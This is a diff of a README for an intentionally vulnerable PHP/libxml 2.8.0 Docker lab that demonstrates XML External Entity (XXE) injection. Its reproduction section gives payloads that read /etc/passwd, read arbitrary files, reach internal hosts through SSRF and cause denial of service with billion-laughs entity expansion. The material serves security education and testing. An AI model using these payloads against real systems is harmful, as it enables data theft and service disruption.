@@ -1,36 +1,45 @@
-# PHP环境 XML外部实体注入漏洞（XXE）
+# PHP XML External Entity Injection (XXE)
 
-环境介绍：
+[中文版本(Chinese version)](README.zh-cn.md)
 
-- PHP 7.0.30
-- libxml 2.8.0
+XML External Entity (XXE) Injection is a vulnerability that occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. This vulnerability can lead to various attacks including disclosure of confidential data, denial of service, server side request forgery, port scanning, and other system impacts.
 
-libxml2.9.0以后，默认不解析外部实体，导致XXE漏洞逐渐消亡。为了演示PHP环境下的XXE漏洞，本例会将libxml2.8.0版本编译进PHP中。PHP版本并不影响XXE利用。
+After libxml 2.9.0, external entity parsing is disabled by default, which largely mitigated XXE vulnerabilities. This environment uses libxml 2.8.0 compiled into PHP to demonstrate XXE vulnerabilities in PHP applications.
 
-使用如下命令编译并启动环境：
+References:
+
+- [OWASP XXE Prevention Cheat Sheet](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
+- [PHP Documentation: libxml](https://www.php.net/manual/en/book.libxml.php)
+- [CWE-611: Improper Restriction of XML External Entity Reference](https://cwe.mitre.org/data/definitions/611.html)
+
+## Environment Setup
+
+This environment is based on the PHP 7.0.30 with libxml 2.8.0, execute the following command to start the environment:
 
 ```
 docker compose up -d
 ```
 
-环境启动后，访问`http://your-ip:8080/index.php`即可看到phpinfo，搜索libxml即可看到其版本为2.8.0。
+After the server starts, visit `http://your-ip:8080/index.php` to see the phpinfo page. You can verify the libxml version (2.8.0) by searching for "libxml" on that page.
 
-Web目录为`./www`，其中包含4个文件：
+The web root directory `./www` contains three vulnerable PHP files demonstrating different XML parsing methods:
 
 ```bash
 $ tree .
 .
-├── dom.php # 示例：使用DOMDocument解析body
+├── dom.php               # Example: XML parsing using DOMDocument
 ├── index.php
-├── SimpleXMLElement.php # 示例：使用SimpleXMLElement类解析body
-└── simplexml_load_string.php # 示例：使用simplexml_load_string函数解析body
+├── SimpleXMLElement.php  # Example: XML parsing using SimpleXMLElement class
+└── simplexml_load_string.php  # Example: XML parsing using simplexml_load_string function
 ```
 
-`dom.php`、`SimpleXMLElement.php`、`simplexml_load_string.php`均可触发XXE漏洞，具体输出点请阅读这三个文件的代码。
+All three files (`dom.php`, `SimpleXMLElement.php`, and `simplexml_load_string.php`) are vulnerable to XXE attacks.
 
-Simple XXE Payload：
+## Vulnerability Reproduction
 
-```
+Send the following XML payload to any of the vulnerable files to read the contents of `/etc/passwd`:
+
+```xml
 <?xml version="1.0" encoding="utf-8"?> 
 <!DOCTYPE xxe [
 <!ELEMENT name ANY >
@@ -40,8 +49,28 @@ Simple XXE Payload：
 </root>
 ```
 
-输出：
+The successful exploitation will display the contents of the file:
 
 ![](1.png)
 
-更多高级利用方法，请自行探索。
+### Advanced Exploitation Techniques
+
+Reading Arbitrary Files:
+
+```xml
+<!ENTITY xxe SYSTEM "file:///path/to/sensitive/file" >
+```
+
+SSRF (Server-Side Request Forgery):
+
+```xml
+<!ENTITY xxe SYSTEM "http://internal.service.local" >
+```
+
+Denial of Service (Billion Laughs Attack):
+
+```xml
+<!ENTITY lol "lol">
+<!ENTITY lol2 "&lol;&lol;">
+<!ENTITY lol3 "&lol2;&lol2;">
+```
